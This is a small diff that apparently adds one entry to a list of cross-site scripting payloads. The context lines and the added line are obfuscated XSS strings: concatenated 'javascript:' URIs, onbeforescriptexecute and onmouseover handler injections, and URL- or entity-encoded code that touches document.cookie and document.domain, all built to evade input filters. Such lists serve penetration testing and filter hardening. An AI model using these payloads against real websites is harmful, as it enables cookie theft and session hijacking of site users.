@@ -26,3 +26,4 @@ JavaScript​://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/
 "><BODY onbeforescriptexecute="c=')'; b='a'; location='jav'+b+'script:x( "+c">
 "><BODYonbeforescriptexecute="x1-'cookie'; c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+x1+c">
 %0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A
+testtest”+onmouseover%3D”alert%26%230000000040%3Bdocument[‘cookie’])
